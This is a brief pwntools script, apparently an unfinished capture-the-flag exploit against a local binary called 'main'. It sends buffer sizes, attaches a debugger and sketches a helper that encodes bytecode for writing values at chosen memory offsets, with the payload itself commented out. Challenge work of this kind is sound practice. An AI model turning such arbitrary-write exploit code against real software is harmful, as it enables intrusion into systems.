from pwn import *

p=process("./main")


p.sendlineafter(b"Pls input the data size",str(0x200000)) 
p.sendlineafter(b"Pls input the code size",str(0x100))


gdb.attach(p)
pause()
def address_write_code(offset,content):
    code=b"\x40"+p32(offset)
    code=code+b"\x2e"+p32(content)

# payload=address_write_code(0x3fe388+0x400000,)
# p.sendlineafter(b"Pls input your code",payload) 
